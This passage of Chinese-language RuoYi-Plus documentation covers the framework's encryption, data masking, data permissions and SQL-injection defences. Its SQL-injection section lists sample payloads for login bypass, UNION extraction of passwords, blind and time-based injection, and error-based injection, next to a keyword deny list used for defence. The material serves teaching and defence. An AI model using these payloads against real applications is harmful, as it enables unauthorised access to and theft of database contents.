# 数据安全

数据安全是企业应用系统的核心防护目标之一,涵盖数据的存储、传输、访问、展示等全生命周期的安全保障。RuoYi-Plus框架提供了完整的数据安全解决方案,包括数据加密存储、敏感数据脱敏、数据权限控制、SQL注入防护、XSS攻击防护等多层次的安全机制。本文档将详细介绍这些安全特性的实现原理和最佳实践。

**核心特性:**

- **多算法数据加密** - 支持AES、RSA、SM2、SM4等多种加密算法,满足不同安全等级需求
- **字段级加密** - 通过注解方式实现字段级别的自动加解密,对业务代码透明
- **敏感数据脱敏** - 提供15种内置脱敏策略,支持基于角色和权限的动态脱敏
- **数据权限控制** - 支持6种数据权限类型,实现精细化的数据访问控制
- **SQL注入防护** - 内置SQL关键字过滤和参数校验,防止恶意SQL注入
- **XSS攻击防护** - 多模式XSS检测,防止跨站脚本攻击
- **API传输加密** - 支持AES+RSA混合加密,保障数据传输安全

---

## 数据加密

### 加密模块架构

RuoYi-Plus的数据加密模块采用分层设计,提供灵活的加密能力:

```
数据加密架构
├── 注解层
│   ├── @EncryptField      # 字段级加密注解
│   └── @ApiEncrypt        # API接口加密注解
├── 核心层
│   ├── EncryptorManager   # 加密器管理器
│   ├── EncryptContext     # 加密上下文
│   └── IEncryptor         # 加密器接口
├── 实现层
│   ├── AesEncryptor       # AES对称加密
│   ├── RsaEncryptor       # RSA非对称加密
│   ├── Sm2Encryptor       # SM2国密非对称加密
│   ├── Sm4Encryptor       # SM4国密对称加密
│   └── Base64Encryptor    # Base64编码
├── 拦截层
│   ├── MybatisEncryptInterceptor  # MyBatis加密拦截器
│   ├── MybatisDecryptInterceptor  # MyBatis解密拦截器
│   └── CryptoFilter               # HTTP加解密过滤器
└── 工具层
    └── EncryptUtils       # 加密工具类
```

### 支持的加密算法

框架支持多种加密算法,通过`AlgorithmType`枚举定义:

```java
/**
 * 加密算法类型枚举
 */
public enum AlgorithmType {

    /**
     * Base64编码
     * 特点: 不需要密钥,仅做编码转换,不是真正的加密
     * 适用: 简单数据混淆,不要求安全性的场景
     */
    BASE64,

    /**
     * AES对称加密
     * 特点: 加解密使用同一密钥,速度快
     * 密钥长度: 16/24/32字节
     * 适用: 大量数据加密,对性能要求高的场景
     */
    AES,

    /**
     * RSA非对称加密
     * 特点: 公钥加密私钥解密,安全性高
     * 密钥长度: 1024/2048/4096位
     * 适用: 密钥交换,数字签名,小量数据加密
     */
    RSA,

    /**
     * SM2国密非对称加密
     * 特点: 中国商用密码标准,基于椭圆曲线
     * 适用: 政务系统,金融系统等要求国密的场景
     */
    SM2,

    /**
     * SM4国密对称加密
     * 特点: 中国商用密码标准,分组密码算法
     * 密钥长度: 128位(16字节)
     * 适用: 政务系统,金融系统等要求国密的场景
     */
    SM4

}
```

### 加密配置

在`application.yml`中配置加密参数:

```yaml
# MyBatis字段加密配置
mybatis-encryptor:
  # 是否启用加密功能
  enable: true
  # 默认加密算法: BASE64/AES/RSA/SM2/SM4
  algorithm: AES
  # 对称加密密钥(AES/SM4使用)
  # AES密钥长度: 16位(AES-128)/24位(AES-192)/32位(AES-256)
  # SM4密钥长度: 16位
  password: "abcdefghijklmnop"
  # RSA/SM2公钥(用于加密)
  public-key: "MIIBIjANBgkqhkiG9..."
  # RSA/SM2私钥(用于解密)
  private-key: "MIIEvQIBADANBg..."
  # 编码方式: BASE64/HEX
  encode: BASE64
```

### 字段级加密

使用`@EncryptField`注解实现字段级自动加解密:

```java
/**
 * 用户实体类
 * 演示字段级加密配置
 */
public class SysUser {

    /**
     * 用户ID
     */
    private Long userId;

    /**
     * 用户名
     */
    private String userName;

    /**
     * 手机号 - 使用默认配置加密
     */
    @EncryptField
    private String phonenumber;

    /**
     * 身份证号 - 指定AES算法加密
     */
    @EncryptField(algorithm = AlgorithmType.AES)
    private String idCard;

    /**
     * 银行卡号 - 使用SM4国密加密
     */
    @EncryptField(algorithm = AlgorithmType.SM4)
    private String bankCard;

    /**
     * 邮箱 - 使用RSA加密并指定密钥
     */
    @EncryptField(
        algorithm = AlgorithmType.RSA,
        publicKey = "MIIBIjAN...",
        privateKey = "MIIEvQI..."
    )
    private String email;

    /**
     * 密码备注 - 使用SM2国密并采用HEX编码
     */
    @EncryptField(
        algorithm = AlgorithmType.SM2,
        encode = EncodeType.HEX
    )
    private String passwordHint;

}
```

**@EncryptField注解参数:**

| 参数 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| algorithm | AlgorithmType | 配置文件默认值 | 加密算法类型 |
| password | String | 配置文件默认值 | 对称加密密钥 |
| publicKey | String | 配置文件默认值 | 非对称加密公钥 |
| privateKey | String | 配置文件默认值 | 非对称加密私钥 |
| encode | EncodeType | 配置文件默认值 | 加密结果编码方式 |

### MyBatis加密拦截器

框架通过MyBatis拦截器实现自动加解密:

```java
/**
 * MyBatis加密拦截器
 * 在INSERT和UPDATE操作前自动加密标注字段
 */
@Intercepts({
    @Signature(
        type = ParameterHandler.class,
        method = "setParameters",
        args = {PreparedStatement.class}
    )
})
public class MybatisEncryptInterceptor implements Interceptor {

    private final EncryptorManager encryptorManager;

    @Override
    public Object intercept(Invocation invocation) throws Throwable {
        // 获取参数对象
        Object parameterObject = getParameterObject(invocation);
        if (parameterObject != null) {
            // 处理加密字段
            encryptFields(parameterObject);
        }
        return invocation.proceed();
    }

    /**
     * 加密对象中标注了@EncryptField的字段
     */
    private void encryptFields(Object obj) {
        Class<?> clazz = obj.getClass();
        // 从缓存获取需要加密的字段
        Set<Field> encryptFields = encryptorManager.getEncryptFields(clazz);
        for (Field field : encryptFields) {
            try {
                field.setAccessible(true);
                Object value = field.get(obj);
                if (value instanceof String) {
                    // 获取加密注解配置
                    EncryptField annotation = field.getAnnotation(EncryptField.class);
                    // 构建加密上下文
                    EncryptContext context = buildContext(annotation);
                    // 执行加密
                    String encrypted = encryptorManager.encrypt(
                        (String) value, context
                    );
                    field.set(obj, encrypted);
                }
            } catch (Exception e) {
                log.error("字段加密失败: {}", field.getName(), e);
            }
        }
    }

}
```

```java
/**
 * MyBatis解密拦截器
 * 在SELECT操作后自动解密结果中的加密字段
 */
@Intercepts({
    @Signature(
        type = ResultSetHandler.class,
        method = "handleResultSets",
        args = {Statement.class}
    )
})
public class MybatisDecryptInterceptor implements Interceptor {

    @Override
    public Object intercept(Invocation invocation) throws Throwable {
        // 执行查询获取结果
        Object result = invocation.proceed();
        if (result != null) {
            // 处理解密
            decryptResult(result);
        }
        return result;
    }

    /**
     * 解密查询结果
     */
    private void decryptResult(Object result) {
        if (result instanceof List) {
            // 列表结果逐个处理
            ((List<?>) result).forEach(this::decryptObject);
        } else {
            decryptObject(result);
        }
    }

    /**
     * 解密单个对象
     */
    private void decryptObject(Object obj) {
        if (obj == null) return;
        Class<?> clazz = obj.getClass();
        Set<Field> encryptFields = encryptorManager.getEncryptFields(clazz);
        for (Field field : encryptFields) {
            try {
                field.setAccessible(true);
                Object value = field.get(obj);
                if (value instanceof String && isEncrypted((String) value)) {
                    EncryptField annotation = field.getAnnotation(EncryptField.class);
                    EncryptContext context = buildContext(annotation);
                    String decrypted = encryptorManager.decrypt(
                        (String) value, context
                    );
                    field.set(obj, decrypted);
                }
            } catch (Exception e) {
                log.error("字段解密失败: {}", field.getName(), e);
            }
        }
    }

}
```

### 加密工具类

`EncryptUtils`提供便捷的加密方法:

```java
/**
 * 加密工具类使用示例
 */
public class EncryptDemo {

    public void demonstrateEncryption() {
        String plainText = "敏感数据内容";
        String password = "1234567890123456";  // 16位密钥

        // ========== AES对称加密 ==========
        // Base64编码结果
        String aesEncrypted = EncryptUtils.encryptByAes(plainText, password);
        String aesDecrypted = EncryptUtils.decryptByAes(aesEncrypted, password);

        // Hex编码结果
        String aesHex = EncryptUtils.encryptByAesHex(plainText, password);
        String aesDecryptedHex = EncryptUtils.decryptByAes(aesHex, password);

        // ========== RSA非对称加密 ==========
        // 生成密钥对
        Map<String, String> rsaKeys = EncryptUtils.generateRsaKey();
        String publicKey = rsaKeys.get("publicKey");
        String privateKey = rsaKeys.get("privateKey");

        // 公钥加密
        String rsaEncrypted = EncryptUtils.encryptByRsa(plainText, publicKey);
        // 私钥解密
        String rsaDecrypted = EncryptUtils.decryptByRsa(rsaEncrypted, privateKey);

        // ========== SM2国密非对称加密 ==========
        // 生成SM2密钥对
        Map<String, String> sm2Keys = EncryptUtils.generateSm2Key();
        String sm2PublicKey = sm2Keys.get("publicKey");
        String sm2PrivateKey = sm2Keys.get("privateKey");

        // SM2加密解密
        String sm2Encrypted = EncryptUtils.encryptBySm2(plainText, sm2PublicKey);
        String sm2Decrypted = EncryptUtils.decryptBySm2(sm2Encrypted, sm2PrivateKey);

        // Hex编码
        String sm2Hex = EncryptUtils.encryptBySm2Hex(plainText, sm2PublicKey);

        // ========== SM4国密对称加密 ==========
        String sm4Password = "1234567890123456";  // 16位密钥
        String sm4Encrypted = EncryptUtils.encryptBySm4(plainText, sm4Password);
        String sm4Decrypted = EncryptUtils.decryptBySm4(sm4Encrypted, sm4Password);

        // ========== 哈希算法 ==========
        // MD5哈希
        String md5Hash = EncryptUtils.encryptByMd5(plainText);
        // SHA256哈希
        String sha256Hash = EncryptUtils.encryptBySha256(plainText);
        // SM3国密哈希
        String sm3Hash = EncryptUtils.encryptBySm3(plainText);

        // ========== Base64编码 ==========
        String base64Encoded = EncryptUtils.encryptByBase64(plainText);
        String base64Decoded = EncryptUtils.decryptByBase64(base64Encoded);
    }

}
```

### API传输加密

使用`@ApiEncrypt`注解实现API接口的请求响应加密:

```java
/**
 * 用户认证控制器
 * 演示API传输加密
 */
@RestController
@RequestMapping("/auth")
public class AuthController {

    /**
     * 用户登录
     * 请求体自动解密,响应体自动加密
     */
    @ApiEncrypt
    @PostMapping("/login")
    public R<LoginVo> login(@RequestBody LoginBody loginBody) {
        // 此时loginBody已经是解密后的数据
        LoginVo loginVo = loginService.login(loginBody);
        // 返回的loginVo会被自动加密
        return R.ok(loginVo);
    }

    /**
     * 获取用户信息
     * 仅响应加密
     */
    @ApiEncrypt(request = false, response = true)
    @GetMapping("/info")
    public R<UserInfoVo> getUserInfo() {
        UserInfoVo userInfo = userService.getCurrentUserInfo();
        return R.ok(userInfo);
    }

    /**
     * 修改密码
     * 仅请求解密
     */
    @ApiEncrypt(request = true, response = false)
    @PostMapping("/updatePassword")
    public R<Void> updatePassword(@RequestBody UpdatePasswordBody body) {
        userService.updatePassword(body);
        return R.ok();
    }

}
```

**API加密流程:**

```
前端加密请求流程:
1. 生成32位随机AES密钥
2. 使用AES密钥加密请求体
3. 使用RSA公钥加密AES密钥
4. 将加密的AES密钥放入请求头(encrypt-key)
5. 将加密后的请求体发送到服务端

后端解密流程:
1. 从请求头获取加密的AES密钥
2. 使用RSA私钥解密AES密钥
3. 使用AES密钥解密请求体
4. 将解密后的数据传递给Controller

后端加密响应流程:
1. 生成32位随机AES密钥
2. 使用AES密钥加密响应体
3. 使用RSA公钥加密AES密钥
4. 将加密的AES密钥放入响应头
5. 返回加密后的响应数据
```

---

## 敏感数据脱敏

### 脱敏模块架构

敏感数据脱敏模块基于Jackson序列化机制实现:

```
脱敏模块架构
├── 注解层
│   └── @Sensitive            # 脱敏注解
├── 策略层
│   └── SensitiveStrategy     # 脱敏策略枚举
├── 服务层
│   └── SensitiveService      # 权限判断接口
└── 处理层
    └── SensitiveHandler      # Jackson序列化处理器
```

### 脱敏策略

框架提供15种内置脱敏策略:

```java
/**
 * 敏感数据脱敏策略枚举
 */
public enum SensitiveStrategy {

    /**
     * 身份证号脱敏
     * 规则: 保留前3位和后4位
     * 示例: 110101199001011234 -> 110***********1234
     */
    ID_CARD(s -> DesensitizedUtil.idCardNum(s, 3, 4)),

    /**
     * 手机号脱敏
     * 规则: 保留前3位和后4位
     * 示例: 13812345678 -> 138****5678
     */
    PHONE(DesensitizedUtil::mobilePhone),

    /**
     * 地址脱敏
     * 规则: 保留前8个字符
     * 示例: 北京市朝阳区xxx街道xxx号 -> 北京市朝阳区***
     */
    ADDRESS(s -> DesensitizedUtil.address(s, 8)),

    /**
     * 电子邮箱脱敏
     * 规则: 保留用户名首尾字符和完整域名
     * 示例: test@example.com -> t**t@example.com
     */
    EMAIL(DesensitizedUtil::email),

    /**
     * 银行卡号脱敏
     * 规则: 保留前4位和后4位
     * 示例: 6222021234567890123 -> 6222***********0123
     */
    BANK_CARD(DesensitizedUtil::bankCard),

    /**
     * 中文姓名脱敏
     * 规则: 保留姓氏,名字用*替代
     * 示例: 张三丰 -> 张**
     */
    CHINESE_NAME(DesensitizedUtil::chineseName),

    /**
     * 固定电话脱敏
     * 规则: 保留区号和后4位
     * 示例: 010-12345678 -> 010-****5678
     */
    FIXED_PHONE(DesensitizedUtil::fixedPhone),

    /**
     * 用户ID脱敏
     * 规则: 生成随机数字替代
     * 示例: 12345 -> [随机数字]
     */
    USER_ID(s -> String.valueOf(DesensitizedUtil.userId())),

    /**
     * 密码脱敏
     * 规则: 全部用*替代
     * 示例: password123 -> ***********
     */
    PASSWORD(DesensitizedUtil::password),

    /**
     * IPv4地址脱敏
     * 规则: 保留网络段
     * 示例: 192.168.1.100 -> 192.168.*.*
     */
    IPV4(DesensitizedUtil::ipv4),

    /**
     * IPv6地址脱敏
     * 规则: 保留前缀
     * 示例: 2001:0db8:85a3::8a2e:0370:7334 -> 2001:0db8:85a3:*:*:*:*:*
     */
    IPV6(DesensitizedUtil::ipv6),

    /**
     * 车牌号脱敏
     * 规则: 支持普通车牌和新能源车牌
     * 示例: 京A12345 -> 京A1***5
     */
    CAR_LICENSE(DesensitizedUtil::carLicense),

    /**
     * 首字符保留
     * 规则: 只显示第一个字符,其余用*替代
     * 示例: TestData -> T*******
     */
    FIRST_MASK(DesensitizedUtil::firstMask),

    /**
     * 清空
     * 规则: 返回空字符串
     * 示例: 任意内容 -> ""
     */
    CLEAR(s -> ""),

    /**
     * 置空
     * 规则: 返回null
     * 示例: 任意内容 -> null
     */
    CLEAR_TO_NULL(s -> null);

    private final Function<String, String> desensitizer;

    SensitiveStrategy(Function<String, String> desensitizer) {
        this.desensitizer = desensitizer;
    }

    public Function<String, String> desensitizer() {
        return desensitizer;
    }

}
```

### 使用脱敏注解

在实体类字段上使用`@Sensitive`注解:

```java
/**
 * 用户信息VO
 * 演示敏感数据脱敏配置
 */
public class UserInfoVo {

    /**
     * 用户ID
     */
    private Long userId;

    /**
     * 用户名
     */
    private String userName;

    /**
     * 手机号 - 脱敏显示
     * 输出: 138****5678
     */
    @Sensitive(strategy = SensitiveStrategy.PHONE)
    private String phonenumber;

    /**
     * 身份证号 - 脱敏显示,admin角色可查看原数据
     * 普通用户输出: 110***********1234
     * admin角色输出: 110101199001011234
     */
    @Sensitive(
        strategy = SensitiveStrategy.ID_CARD,
        roleKey = {"admin", "manager"}
    )
    private String idCard;

    /**
     * 邮箱 - 脱敏显示,有user:detail权限可查看原数据
     * 无权限输出: t**t@example.com
     * 有权限输出: test@example.com
     */
    @Sensitive(
        strategy = SensitiveStrategy.EMAIL,
        perms = {"user:detail", "user:export"}
    )
    private String email;

    /**
     * 银行卡号 - 脱敏显示,满足角色或权限之一即可查看
     * 条件: 拥有finance角色 OR 拥有user:finance权限
     */
    @Sensitive(
        strategy = SensitiveStrategy.BANK_CARD,
        roleKey = {"finance"},
        perms = {"user:finance"}
    )
    private String bankCard;

    /**
     * 家庭住址 - 脱敏显示
     * 输出: 北京市朝阳区***
     */
    @Sensitive(strategy = SensitiveStrategy.ADDRESS)
    private String address;

    /**
     * 真实姓名 - 脱敏显示
     * 输出: 张**
     */
    @Sensitive(strategy = SensitiveStrategy.CHINESE_NAME)
    private String realName;

    /**
     * 车牌号 - 脱敏显示
     * 输出: 京A1***5
     */
    @Sensitive(strategy = SensitiveStrategy.CAR_LICENSE)
    private String carLicense;

}
```

**@Sensitive注解参数:**

| 参数 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| strategy | SensitiveStrategy | 必填 | 脱敏策略 |
| roleKey | String[] | {} | 允许查看原数据的角色标识(OR关系) |
| perms | String[] | {} | 允许查看原数据的权限标识(OR关系) |

### 脱敏权限判断

实现`SensitiveService`接口自定义权限判断逻辑:

```java
/**
 * 脱敏服务实现
 * 判断当前用户是否需要进行数据脱敏
 */
@Service
public class SensitiveServiceImpl implements SensitiveService {

    /**
     * 判断是否需要脱敏
     * @param roleKey 允许查看原始数据的角色数组
     * @param perms 允许查看原始数据的权限数组
     * @return true需要脱敏,false不脱敏
     */
    @Override
    public boolean isSensitive(String[] roleKey, String[] perms) {
        // 获取当前登录用户
        LoginUser loginUser = LoginHelper.getLoginUser();
        if (loginUser == null) {
            // 未登录用户需要脱敏
            return true;
        }

        // 超级管理员不脱敏
        if (LoginHelper.isSuperAdmin()) {
            return false;
        }

        // 检查角色权限(OR关系)
        if (ArrayUtil.isNotEmpty(roleKey)) {
            Set<String> userRoles = loginUser.getRolePermission();
            for (String role : roleKey) {
                if (userRoles.contains(role)) {
                    return false;  // 拥有指定角色,不脱敏
                }
            }
        }

        // 检查菜单权限(OR关系)
        if (ArrayUtil.isNotEmpty(perms)) {
            Set<String> userPerms = loginUser.getMenuPermission();
            for (String perm : perms) {
                if (userPerms.contains(perm)) {
                    return false;  // 拥有指定权限,不脱敏
                }
            }
        }

        // 默认需要脱敏
        return true;
    }

}
```

### 脱敏处理器

Jackson序列化处理器实现自动脱敏:

```java
/**
 * 敏感数据序列化处理器
 * 在JSON序列化时自动对敏感字段进行脱敏处理
 */
public class SensitiveHandler extends JsonSerializer<String>
    implements ContextualSerializer {

    private SensitiveStrategy strategy;
    private String[] roleKey;
    private String[] perms;

    @Override
    public void serialize(String value, JsonGenerator gen,
            SerializerProvider serializers) throws IOException {
        if (StrUtil.isBlank(value)) {
            gen.writeString(value);
            return;
        }

        // 获取脱敏服务
        SensitiveService sensitiveService = SpringUtils.getBean(
            SensitiveService.class
        );

        // 判断是否需要脱敏
        if (sensitiveService.isSensitive(roleKey, perms)) {
            // 执行脱敏
            gen.writeString(strategy.desensitizer().apply(value));
        } else {
            // 不脱敏,输出原始值
            gen.writeString(value);
        }
    }

    @Override
    public JsonSerializer<?> createContextual(SerializerProvider prov,
            BeanProperty property) throws JsonMappingException {
        Sensitive annotation = property.getAnnotation(Sensitive.class);
        if (annotation != null) {
            SensitiveHandler handler = new SensitiveHandler();
            handler.strategy = annotation.strategy();
            handler.roleKey = annotation.roleKey();
            handler.perms = annotation.perms();
            return handler;
        }
        return prov.findNullValueSerializer(property);
    }

}
```

---

## 数据权限控制

### 数据权限架构

数据权限模块实现精细化的数据访问控制:

```
数据权限架构
├── 注解层
│   ├── @DataPermission    # 数据权限组注解
│   └── @DataColumn        # 数据列权限注解
├── 枚举层
│   └── DataScopeType      # 数据权限类型枚举
├── 处理层
│   └── PlusDataPermissionHandler  # 权限SQL生成处理器
└── 服务层
    └── ISysDataScopeService       # 数据范围服务接口
```

### 数据权限类型

框架支持6种数据权限类型:

```java
/**
 * 数据权限类型枚举
 */
public enum DataScopeType {

    /**
     * 全部数据权限
     * 不添加任何过滤条件
     */
    ALL("1", "", ""),

    /**
     * 自定义数据权限
     * 根据角色配置的自定义部门列表过滤
     * SQL: dept_id IN (自定义部门ID列表)
     */
    CUSTOM("2",
        " #{#deptName} IN ( #{@sdss.getRoleCustom( #user.roleId )} ) ",
        " 1 = 0 "),

    /**
     * 部门数据权限
     * 只能查看本部门数据
     * SQL: dept_id = 当前用户部门ID
     */
    DEPT("3",
        " #{#deptName} = #{#user.deptId} ",
        " 1 = 0 "),

    /**
     * 部门及以下数据权限
     * 可查看本部门及所有子部门数据
     * SQL: dept_id IN (本部门及所有子部门ID)
     */
    DEPT_AND_CHILD("4",
        " #{#deptName} IN ( #{@sdss.getDeptAndChild( #user.deptId )} ) ",
        " 1 = 0 "),

    /**
     * 仅本人数据权限
     * 只能查看自己创建的数据
     * SQL: create_by = 当前用户ID
     */
    SELF("5",
        " #{#userName} = #{#user.userId} ",
        " 1 = 0 "),

    /**
     * 部门及以下或本人数据
     * 可查看本部门及子部门数据,或自己创建的数据
     * SQL: dept_id IN (...) OR create_by = 当前用户ID
     */
    DEPT_AND_CHILD_OR_SELF("6",
        " #{#deptName} IN ( #{@sdss.getDeptAndChild( #user.deptId )} ) " +
        " OR #{#userName} = #{#user.userId} ",
        " 1 = 0 ");

    private final String code;
    private final String sqlTemplate;
    private final String elseSql;

}
```

### 使用数据权限注解

在Mapper接口或Service方法上使用数据权限注解:

```java
/**
 * 用户Mapper接口
 * 演示数据权限配置
 */
@Mapper
public interface SysUserMapper extends BaseMapper<SysUser> {

    /**
     * 查询用户列表 - 带数据权限
     *
     * @DataColumn配置:
     * - key: SpEL表达式中的变量名
     * - value: 数据库表中的字段名(支持表别名)
     */
    @DataPermission({
        @DataColumn(key = "deptName", value = "d.dept_id"),
        @DataColumn(key = "userName", value = "u.user_id")
    })
    List<SysUserVo> selectUserList(@Param("user") SysUserBo user);

    /**
     * 查询部门用户 - 仅部门权限
     */
    @DataPermission({
        @DataColumn(key = "deptName", value = "dept_id")
    })
    List<SysUser> selectDeptUserList(@Param("deptId") Long deptId);

    /**
     * 查询用户详情 - 无数据权限
     * 通过空数组显式禁用数据权限
     */
    @DataPermission({})
    SysUser selectUserById(@Param("userId") Long userId);

}
```

### 数据权限处理器

数据权限处理器负责生成SQL过滤条件:

```java
/**
 * 数据权限处理器
 * 基于MyBatis-Plus的DataPermissionHandler扩展
 */
@Slf4j
public class PlusDataPermissionHandler implements DataPermissionHandler {

    /**
     * 数据权限注解缓存
     * Key: Mapper方法全限定名
     * Value: 数据权限注解
     */
    private final Map<String, DataPermission> dataPermissionCacheMap =
        new ConcurrentHashMap<>();

    @Override
    public Expression getSqlSegment(Expression where, String mappedStatementId) {
        // 1. 获取当前执行方法的数据权限注解
        DataPermission dataPermission = getDataPermission(mappedStatementId);
        if (dataPermission == null || dataPermission.value().length == 0) {
            return where;
        }

        // 2. 获取当前登录用户
        LoginUser loginUser = getLoginUser();
        if (loginUser == null) {
            return where;
        }

        // 3. 超级管理员跳过数据权限
        if (LoginHelper.isSuperAdmin()) {
            return where;
        }

        // 4. 租户管理员跳过数据权限(在租户范围内)
        if (LoginHelper.isTenantAdmin()) {
            return where;
        }

        // 5. 构建数据权限SQL
        String dataFilterSql = buildDataFilterSql(dataPermission, loginUser);
        if (StrUtil.isBlank(dataFilterSql)) {
            return where;
        }

        // 6. 合并原有条件和数据权限条件
        try {
            Expression dataFilterExpression = CCJSqlParserUtil
                .parseCondExpression(dataFilterSql);
            if (where == null) {
                return dataFilterExpression;
            }
            return new AndExpression(where, dataFilterExpression);
        } catch (JSQLParserException e) {
            log.error("数据权限SQL解析异常: {}", dataFilterSql, e);
            return where;
        }
    }

    /**
     * 构建数据权限过滤SQL
     */
    private String buildDataFilterSql(DataPermission dp, LoginUser user) {
        StringBuilder sqlBuilder = new StringBuilder();

        // 获取用户的数据权限范围
        DataScopeType dataScopeType = getDataScopeType(user);

        // 构建SQL条件
        for (DataColumn column : dp.value()) {
            String sql = dataScopeType.getSqlTemplate();
            // 替换SpEL变量
            sql = parseSpelExpression(sql, column, user);
            if (sqlBuilder.length() > 0) {
                sqlBuilder.append(" AND ");
            }
            sqlBuilder.append("(").append(sql).append(")");
        }

        return sqlBuilder.toString();
    }

}
```

### 数据范围服务

数据范围服务提供权限数据查询:

```java
/**
 * 数据权限服务接口
 */
public interface ISysDataScopeService {

    /**
     * 获取角色自定义数据权限
     * @param roleId 角色ID
     * @return 部门ID列表(逗号分隔),无权限返回"-1"
     */
    String getRoleCustom(Long roleId);

    /**
     * 获取部门及以下数据权限
     * @param deptId 部门ID
     * @return 部门ID列表(逗号分隔),无权限返回"-1"
     */
    String getDeptAndChild(Long deptId);

}

/**
 * 数据权限服务实现
 */
@Service("sdss")
public class SysDataScopeServiceImpl implements ISysDataScopeService {

    @Autowired
    private ISysRoleDeptService roleDeptService;

    @Autowired
    private ISysDeptService deptService;

    /**
     * 获取角色自定义权限数据
     * 使用缓存提高查询性能
     */
    @Override
    @Cacheable(cacheNames = CacheNames.SYS_ROLE_CUSTOM, key = "#roleId")
    public String getRoleCustom(Long roleId) {
        // 查询角色关联的部门
        List<Long> deptIds = roleDeptService.selectDeptIdsByRoleId(roleId);
        if (CollUtil.isEmpty(deptIds)) {
            return "-1";  // 返回不可能匹配的值,确保安全
        }
        return CollUtil.join(deptIds, ",");
    }

    /**
     * 获取部门及以下权限数据
     * 使用缓存提高查询性能
     */
    @Override
    @Cacheable(cacheNames = CacheNames.SYS_DEPT_AND_CHILD, key = "#deptId")
    public String getDeptAndChild(Long deptId) {
        // 查询部门及所有子部门
        List<Long> deptIds = deptService.selectDeptIdsByParentId(deptId);
        if (CollUtil.isEmpty(deptIds)) {
            return "-1";
        }
        // 包含本部门
        deptIds.add(0, deptId);
        return CollUtil.join(deptIds, ",");
    }

}
```

---

## SQL注入防护

### SQL注入风险

SQL注入是最常见的Web安全漏洞之一,攻击者通过构造恶意SQL语句来获取、修改或删除数据库中的数据。

**常见SQL注入攻击方式:**

```sql
-- 1. 登录绕过
' OR '1'='1
' OR 1=1 --
admin'--

-- 2. 联合查询注入
' UNION SELECT username,password FROM users --

-- 3. 盲注
' AND (SELECT COUNT(*) FROM users) > 0 --
' AND SUBSTRING(username,1,1)='a' --

-- 4. 时间盲注
' AND SLEEP(5) --
' AND BENCHMARK(10000000,MD5('test')) --

-- 5. 报错注入
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e)) --
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1) --
```

### SQL过滤工具

框架提供`SqlUtil`工具类防止SQL注入:

```java
/**
 * SQL工具类
 * 提供SQL注入防护功能
 */
public class SqlUtil {

    /**
     * 危险SQL关键字正则表达式
     * 检测常见SQL注入攻击向量
     */
    private static final String SQL_REGEX =
        "and|extractvalue|updatexml|sleep|exec|insert|select|delete|update|" +
        "drop|count|chr|mid|master|truncate|char|declare|or|union|like|\\+|/\\*|user\\(\\)";

    /**
     * ORDER BY合法字符正则
     * 只允许: 字母、数字、下划线、空格、逗号、小数点
     */
    private static final Pattern SQL_PATTERN =
        Pattern.compile("^[a-zA-Z0-9_\\ \\,\\.]+$");

    /**
     * 校验ORDER BY语句安全性
     * @param value ORDER BY子句内容
     * @return 校验通过返回原值
     * @throws IllegalArgumentException 包含非法字符时抛出
     */
    public static String escapeOrderBySql(String value) {
        if (StrUtil.isBlank(value)) {
            return value;
        }
        if (!isValidOrderBySql(value)) {
            throw new IllegalArgumentException(
                "ORDER BY子句包含非法字符: " + value
            );
        }
        return value;
    }

    /**
     * 验证ORDER BY语句格式
     * @param value 待验证的ORDER BY子句
     * @return true合法,false非法
     */
    public static boolean isValidOrderBySql(String value) {
        return SQL_PATTERN.matcher(value).matches();
    }

    /**
     * 过滤SQL关键字
     * @param value 待检查的字符串
     * @throws IllegalArgumentException 发现SQL关键字时抛出
     */
    public static void filterKeyword(String value) {
        if (StrUtil.isBlank(value)) {
            return;
        }
        // 转小写后检查
        String lowerValue = value.toLowerCase();
        String[] keywords = SQL_REGEX.split("\\|");
        for (String keyword : keywords) {
            if (lowerValue.contains(keyword)) {
                throw new IllegalArgumentException(
                    "检测到SQL注入风险,包含关键字: " + keyword
                );
            }
        }
    }

    /**
     * 检查是否包含SQL注入风险
     * @param value 待检查的字符串
     * @return true存在风险,false安全
     */
    public static boolean hasSqlInjectionRisk(String value) {
        if (StrUtil.isBlank(value)) {
            return false;
        }
        try {
            filterKeyword(value);
            return false;
        } catch (IllegalArgumentException e) {
            return true;
        }
    }

}
```

### 使用示例

```java
/**
 * 用户查询服务
 * 演示SQL注入防护
 */
@Service
public class UserQueryService {

    @Autowired
    private SysUserMapper userMapper;

    /**
     * 分页查询用户 - 带排序
     * 对排序字段进行SQL注入检查
     */
    public TableDataInfo<SysUserVo> selectUserPage(
            SysUserBo bo, PageQuery pageQuery) {

        // 校验排序字段安全性
        String orderBy = pageQuery.getOrderBy();
        if (StrUtil.isNotBlank(orderBy)) {
            // 方式1: 使用escapeOrderBySql校验并返回
            orderBy = SqlUtil.escapeOrderBySql(orderBy);

            // 方式2: 手动检查
            if (!SqlUtil.isValidOrderBySql(orderBy)) {
                throw new ServiceException("排序参数不合法");
            }
        }

        // 校验查询参数
        filterQueryParams(bo);

        // 执行查询
        return PageHelper.startPage(pageQuery)
            .doSelectPage(() -> userMapper.selectUserList(bo));
    }

    /**
     * 过滤查询参数中的SQL注入风险
     */
    private void filterQueryParams(SysUserBo bo) {
        if (bo == null) return;

        // 检查用户名
        if (StrUtil.isNotBlank(bo.getUserName())) {
            SqlUtil.filterKeyword(bo.getUserName());
        }

        // 检查部门名称
        if (StrUtil.isNotBlank(bo.getDeptName())) {
            SqlUtil.filterKeyword(bo.getDeptName());
        }

        // 检查手机号
        if (StrUtil.isNotBlank(bo.getPhonenumber())) {
            SqlUtil.filterKeyword(bo.getPhonenumber());
        }
    }

    /**
     * 动态条件查询 - 使用参数化查询防止注入
     * 推荐方式: 使用MyBatis-Plus的条件构造器
     */
    public List<SysUser> selectByCondition(String userName, String status) {
        // 使用LambdaQueryWrapper,自动参数化
        return userMapper.selectList(
            new LambdaQueryWrapper<SysUser>()
                .like(StrUtil.isNotBlank(userName),
                    SysUser::getUserName, userName)
                .eq(StrUtil.isNotBlank(status),
                    SysUser::getStatus, status)
        );
    }

}
```

### MyBatis防注入

使用MyBatis时,优先使用`#{}`占位符:

```xml
<!-- 安全: 使用#{}占位符,会被预编译为参数 -->
<select id="selectUserByName" resultType="SysUser">
    SELECT * FROM sys_user WHERE user_name = #{userName}
</select>

<!-- 危险: 使用${}直接拼接,存在SQL注入风险 -->
